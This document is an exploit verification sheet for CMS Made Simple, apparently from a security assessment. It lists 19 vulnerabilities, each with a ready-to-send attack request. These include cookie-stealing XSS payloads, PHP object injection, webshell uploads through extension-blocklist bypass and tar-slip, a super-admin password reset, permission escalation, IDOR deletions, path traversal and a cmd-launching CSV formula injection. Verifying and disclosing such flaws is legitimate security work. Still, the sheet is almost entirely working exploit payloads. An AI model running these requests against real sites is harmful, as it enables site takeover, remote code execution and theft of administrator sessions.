# CMSMS — Exploit Verification Sheet

`TARGET` = host. `KEY` = the logged-in admin's `__c` token (copy it from any admin URL). Frontend params are prefixed `cntnt01`, admin params `m1_`.

---

**1. News fesubmit — stored XSS (unauthenticated)**
- URL: `POST https://TARGET/index.php?mact=News,cntnt01,fesubmit,0`
- Data: `cntnt01submit=1&cntnt01title=x&cntnt01content=<img src=x onerror=alert(document.cookie)>`
- Req: News "Allow Front End Submission" on; article published/approved to fire. No login.

**2. Bookmarks — stored XSS + open redirect**
- URL: `https://TARGET/admin/makebookmark.php?__c=KEY&title=<img src=x onerror=alert(1)>&ref=ZXZpbC5jb20=` then view `https://TARGET/admin/listbookmarks.php?__c=KEY`
- Data: (in URL) `title=<img ...>`, `ref=` base64 of `evil.com`
- Req: valid admin session (own KEY) — self-XSS.

**3. MicroTiny filepicker — reflected XSS**
- URL: `https://TARGET/admin/moduleinterface.php?mact=MicroTiny,m1_,filepicker,0&__c=KEY&showtemplate=false&field=x';alert(document.cookie);//`
- Req: admin login + KEY.

**4. eventhandlers.php — reflected XSS**
- URL: `https://TARGET/admin/eventhandlers.php?__c=KEY&action=showeventhelp&module=Core&event=<script>alert(document.cookie)</script>`
- Req: admin login + KEY.

**5. CMSContentManager — PHP object injection**
- URL: `POST https://TARGET/admin/moduleinterface.php?__c=KEY`
- Data: `mact=CMSContentManager,m1_,admin_bulk_delete,0&m1_submit=1&m1_confirm1=1&m1_confirm2=1&m1_multicontent=<base64(serialize($obj))>`
- Req: content-management access; a POP gadget for RCE-level impact.

**6. Bulk delete — access-control bypass (IDOR)**
- URL: `POST https://TARGET/admin/moduleinterface.php?__c=KEY`
- Data: `mact=CMSContentManager,m1_,admin_bulk_delete,0&m1_action=admin_bulk_delete&m1_submit=1&m1_confirm1=1&m1_confirm2=1&m1_multicontent=YTozOntpOjA7aToyO2k6MTtpOjM7aToyO2k6NDt9` (= `serialize([2,3,4])`)
- Req: "Remove Pages" perm; deletes pages the user doesn't own.

**7. CmsJobManager — unauthenticated cron trigger**
- URL: `https://TARGET/index.php?mact=CmsJobManager,cntnt01,process,0&cms_cron=1`
- Req: none.

**8. FileManager upload — extension-blocklist bypass (RCE)**
- URL: `POST https://TARGET/admin/moduleinterface.php?mact=FileManager,m1_,upload,0&__c=KEY` (multipart, field `m1_files[]`)
- Data: file `shell.phtml` (or `.pht`/`.phar`/`.htaccess`) with PHP body; fetch at `https://TARGET/uploads/<cwd>/shell.phtml`
- Req: "Modify Files"; server maps that extension to PHP.

**9. edituser.php — privilege escalation (reset super-admin)**
- URL: `POST https://TARGET/admin/edituser.php?__c=KEY`
- Data: `user_id=1&user=admin&password=Pwned123!&passwordagain=Pwned123!&email=&submit=1`
- Req: "Manage Users" perm (non-super-admin).

**10. FileManager unpack — tar-slip arbitrary file write (RCE)**
- URL: upload `evil.tar` (finding #8 path), then `POST https://TARGET/admin/moduleinterface.php?mact=FileManager,m1_,unpack,0&__c=KEY` selecting it
- Data: tar containing an entry named `../../shell.php` with PHP body
- Req: "Modify Files".

**11. changegroupperm.php — privilege escalation (grant any perm)**
- URL: `POST https://TARGET/admin/changegroupperm.php?__c=KEY`
- Data: `submitted=1&pg_<PERM_ID>_<MY_GROUP_ID>=1` (PERM_ID from the page; MY_GROUP_ID ≠ 1)
- Req: "Manage Groups" perm.

**12. FileManager newdir/copy — path traversal**
- URL: `POST https://TARGET/admin/moduleinterface.php?mact=FileManager,m1_,newdir,0&__c=KEY`
- Data: `m1_path=../../&m1_newdirname=evil&m1_submit=1`
- Req: "Modify Files".

**13. FilePicker ajax_cmd — missing authorization**
- URL: `POST https://TARGET/admin/moduleinterface.php?mact=FilePicker,m1_,ajax_cmd,0&__c=KEY`
- Data: `cmd=mkdir&cwd=&val=foo/../../../evil` (or `cmd=del&val=<file>`, `cmd=upload`)
- Req: any authenticated admin (no file permission needed).

**14. Search — CSV/formula injection (unauth seed)**
- Seed: `https://TARGET/index.php?mact=Search,cntnt01,dosearch,0&cntnt01searchinput==cmd|'/c calc'!A1`
- Export: `https://TARGET/admin/moduleinterface.php?mact=Search,m1_,defaultadmin,0&__c=KEY&m1_exportcsv=1`
- Req: unauth to seed; "Manage Search" admin opens `search.csv` in a spreadsheet.

**15. Bookmarks — IDOR**
- URL: `https://TARGET/admin/deletebookmark.php?__c=KEY&bookmark_id=<other_users_id>`
- Req: admin session; deletes another user's bookmark.

**16. Content edit — mass-assignment privilege escalation**
- URL: `POST https://TARGET/admin/moduleinterface.php?mact=CMSContentManager,m1_,admin_editcontent,0&__c=KEY`
- Data: `m1_content_id=<page_you_can_edit>&ownerid=<your_uid>&additional_editors[]=<your_uid>&m1_submit=1`
- Req: additional-editor rights on that page (not owner/admin).

**17. Menu text — stored XSS in breadcrumb title attribute**
- Set: `POST .../moduleinterface.php?mact=CMSContentManager,m1_,admin_editcontent,0&__c=KEY` → `m1_content_id=<page>&menutext=" onmouseover="alert(document.cookie)&m1_submit=1`
- Fire: visit any frontend page rendering breadcrumbs, hover the link
- Req: content editor; template uses breadcrumbs.

**18. Content property — zero-click stored XSS (image/extra)**
- Set: `POST .../moduleinterface.php?mact=CMSContentManager,m1_,admin_editcontent,0&__c=KEY` → `m1_content_id=<page>&image=x" onerror="alert(document.cookie)&m1_submit=1`
- Fire: visit any frontend page whose template uses `{page_image tag=1}` (auto-fires)
- Req: content editor; template outputs page image or an `extra` field.

**19. Link content type — stored XSS via URL (javascript: / attribute)**
- Set: `POST .../moduleinterface.php?mact=CMSContentManager,m1_,admin_editcontent,0&__c=KEY` → `m1_content_type=link&title=Evil&url=javascript:alert(document.cookie)&m1_submit=1`
- Fire: click that entry in the site menu (or use `url=x" onmouseover="alert(1)`)
- Req: "Add Pages"; the Link page appears in a rendered menu.
